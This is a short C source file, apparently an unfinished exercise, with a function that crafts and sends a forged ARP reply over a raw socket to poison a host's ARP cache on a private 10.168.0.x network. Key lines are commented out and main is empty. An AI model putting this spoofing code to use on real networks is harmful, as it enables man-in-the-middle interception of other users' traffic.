#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <ifaddrs.h>


#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>

#define ITS_IP "10.168.0.1"
#define YOUR_IP "10.168.0.2"


void do_spoof(int fd, char* if_name, uint8_t* my_mac, uint32_t its_ip, uint8_t* your_mac, uint32_t your_ip){
	struct ether_arp resp;
	struct ifreq ifr;
	//set_ifr_name(&ifr, if_name);

	struct sockaddr_ll addr = {0};
	addr.sll_family         = AF_PACKET;
	//addr.sll_ifindex        = get_ifr_ifindex(fd, &ifr);
	addr.sll_halen          = ETHER_ADDR_LEN;
	addr.sll_protocol       = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, your_mac, ETHER_ADDR_LEN);

	resp.arp_hrd = htons(ARPHRD_ETHER);
	resp.arp_pro = htons(ETH_P_IP);
	resp.arp_hln = ETHER_ADDR_LEN;
	resp.arp_pln = sizeof(in_addr_t);
	resp.arp_op  = htons(ARPOP_REPLY);

	memcpy(&resp.arp_sha, my_mac, sizeof(resp.arp_sha));
	memcpy(&resp.arp_spa, &its_ip,  sizeof(resp.arp_spa));
	memcpy(&resp.arp_tha, your_mac,   sizeof(resp.arp_tha));
	memcpy(&resp.arp_tpa, &your_ip,   sizeof(resp.arp_tpa));

	if (sendto(fd, &resp, sizeof(resp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		printf("spoof: error\n");
	}
}


int main(){

    return 0;
}